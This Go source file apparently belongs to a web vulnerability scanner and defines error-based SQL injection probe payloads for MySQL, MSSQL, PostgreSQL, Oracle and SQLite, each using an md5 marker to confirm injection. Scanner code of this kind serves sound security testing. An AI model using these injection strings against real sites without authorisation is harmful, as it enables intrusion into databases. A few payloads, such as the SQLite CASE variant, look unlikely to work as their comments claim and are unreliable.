/**
* @Author: shaochuyu
* @Date: 5/7/2022 11:30
 */
package sqli_payload

import (
	"crypto/md5"
	"encoding/hex"
	"fmt"
	expr "google.golang.org/genproto/googleapis/api/expr/v1alpha1"
	"strings"
	"wscan/core/http"
	"wscan/core/utils"
)

type Payload struct {
	Title         string
	PositiveFmt   string
	RegativeFmt   string
	PositiveExpr  expr.Expr
	NegativeExpr  expr.Expr
	ParameterType string
	Dbms          []string
}

func (p *Payload) MatchDbms(flow http.Flow) {

}

func (p *Payload) MatchParameterType() {

}

// /jsy/product_view.asp?id=@@f9zqL  // Microsoft OLE DB Provider for ODBC Drivers
func GetPayloads() (payloads []Payload) {
	// MySQL extractvalue: extractvalue() returns at most 32 characters.
	// concat(char(126), md5_result) = 1 + 32 = 33 chars, causing truncation.
	// Fix: use substr(md5(...),1,20) so marker + 20 chars fits within 32 chars.
	r1 := utils.RandomStr(utils.AsciiDigits, 10)
	payloads = []Payload{
		{Title: "extractvalue function error based case",
			PositiveFmt:   fmt.Sprintf(`'and/**/extractvalue(1,concat(char(126),substr(md5(%s),1,20)))and'"`, r1),
			RegativeFmt:   utils.MD5(r1)[:20],
			ParameterType: http.ParameterTypeSuffix},
		{Title: "extractvalue function error based case",
			PositiveFmt:   fmt.Sprintf(`"and/**/extractvalue(1,concat(char(126),substr(md5(%s),1,20)))and"`, r1),
			RegativeFmt:   utils.MD5(r1)[:20],
			ParameterType: http.ParameterTypeSuffix},
	}
	r1 = utils.RandomStr(utils.AsciiDigits, 10)
	payloads = append(payloads, Payload{Title: "extractvalue function error based case",
		PositiveFmt:   fmt.Sprintf("extractvalue(1,concat(char(126),substr(md5(%s),1,20)))", r1),
		RegativeFmt:   utils.MD5(r1)[:20],
		ParameterType: http.ParameterTypeValue})

	// MSSQL: HashBytes('MD5',...) returns varbinary, sys.fn_sqlvarbasetostr converts to "0x<UPPER_HEX>" string.
	// The convert(int,...) error will contain the 0x-prefixed uppercase hex.
	r1 = utils.RandomStr(utils.AsciiDigits, 10)
	mssqMD5Hex := strings.ToUpper(hex.EncodeToString(func() []byte {
		h := md5.New()
		h.Write([]byte(r1))
		return h.Sum(nil)
	}()))
	payloads = append(payloads, Payload{Title: "MSSQL convert error based case",
		PositiveFmt:   fmt.Sprintf(`convert(int,sys.fn_sqlvarbasetostr(HashBytes('MD5','%s')))`, r1),
		RegativeFmt:   "0x" + mssqMD5Hex,
		ParameterType: http.ParameterTypeValue})

	payloads = append(payloads, Payload{Title: "comment test", PositiveFmt: "--", ParameterType: http.ParameterTypeValue})

	r1 = utils.RandomStr(utils.AsciiDigits, 10)
	payloads = append(payloads, Payload{Title: "md5 union select error based case",
		PositiveFmt:   fmt.Sprintf(" ' and 1=0 ;select md5(%s) --", r1),
		RegativeFmt:   utils.MD5(r1),
		ParameterType: http.ParameterTypeValue})

	r1 = utils.RandomStr(utils.AsciiDigits, 10)
	payloads = append(payloads, Payload{Title: "md5 select error based case",
		PositiveFmt:   fmt.Sprintf(" and 1=0 ;\nselect md5(%s),md5(%s) -- ", r1, r1),
		RegativeFmt:   utils.MD5(r1),
		ParameterType: http.ParameterTypeSuffix})
	r1 = utils.RandomStr(utils.AsciiDigits, 10)
	payloads = append(payloads, Payload{
		Title: "Multiple md5 union select in error-based case",
		PositiveFmt: fmt.Sprintf(`' and 1=0 union select md5(%s),md5(%s),md5(%s),md5(%s), md5(%s),md5(%s),md5(%s),md5(%s), md5(%s),md5(%s),md5(%s),md5(%s) -- `,
			r1, r1, r1, r1,
			r1, r1, r1, r1,
			r1, r1, r1, r1),
		RegativeFmt:   utils.MD5(r1),
		ParameterType: http.ParameterTypeSuffix,
	})

	// D1-08: 新增 PostgreSQL 报错注入 payload
	// PostgreSQL: CAST() 错误注入，将 md5 结果转为 integer 触发错误
	r1 = utils.RandomStr(utils.AsciiDigits, 10)
	payloads = append(payloads, Payload{
		Title:         "PostgreSQL CAST error based case",
		PositiveFmt:   fmt.Sprintf(`CAST('%s' AS INTEGER)`, utils.MD5(r1)),
		RegativeFmt:   utils.MD5(r1),
		ParameterType: http.ParameterTypeSuffix,
	})

	// PostgreSQL: 使用 version() 和 CAST 错误
	r1 = utils.RandomStr(utils.AsciiDigits, 10)
	payloads = append(payloads, Payload{
		Title:         "PostgreSQL CAST md5 error based case (value)",
		PositiveFmt:   fmt.Sprintf(`1 AND CAST('%s' AS INTEGER)`, utils.MD5(r1)),
		RegativeFmt:   utils.MD5(r1),
		ParameterType: http.ParameterTypeValue,
	})

	// D1-08: 新增 Oracle 报错注入 payload
	// Oracle: CTXSYS.DRITHSX.SN 错误注入
	r1 = utils.RandomStr(utils.AsciiDigits, 10)
	payloads = append(payloads, Payload{
		Title:         "Oracle CTXSYS.DRITHSX.SN error based case",
		PositiveFmt:   fmt.Sprintf(`1 AND CTXSYS.DRITHSX.SN(1,'%s')=1`, utils.MD5(r1)),
		RegativeFmt:   utils.MD5(r1),
		ParameterType: http.ParameterTypeSuffix,
	})

	// Oracle: XMLType 错误注入
	r1 = utils.RandomStr(utils.AsciiDigits, 10)
	payloads = append(payloads, Payload{
		Title:         "Oracle XMLType error based case",
		PositiveFmt:   fmt.Sprintf(`1 AND (SELECT upper(XMLType(chr(60)||chr(58)||'%s'||chr(62))) FROM dual) IS NOT NULL`, utils.MD5(r1)),
		RegativeFmt:   utils.MD5(r1),
		ParameterType: http.ParameterTypeSuffix,
	})

	// D1-08: 新增 SQLite 报错注入 payload
	// SQLite: 使用 CASE WHEN + 子查询触发错误
	r1 = utils.RandomStr(utils.AsciiDigits, 10)
	payloads = append(payloads, Payload{
		Title:         "SQLite CASE error based case",
		PositiveFmt:   fmt.Sprintf(`1 AND CASE WHEN (1=1) THEN 1 ELSE CAST('%s' AS INTEGER) END`, utils.MD5(r1)),
		RegativeFmt:   utils.MD5(r1),
		ParameterType: http.ParameterTypeSuffix,
	})

	// SQLite: 使用 NULLIF 触发除零错误
	r1 = utils.RandomStr(utils.AsciiDigits, 10)
	payloads = append(payloads, Payload{
		Title:         "SQLite NULLIF error based case",
		PositiveFmt:   fmt.Sprintf(`1/(SELECT NULLIF('%s',''))`, utils.MD5(r1)),
		RegativeFmt:   utils.MD5(r1),
		ParameterType: http.ParameterTypeValue,
	})

	return
}
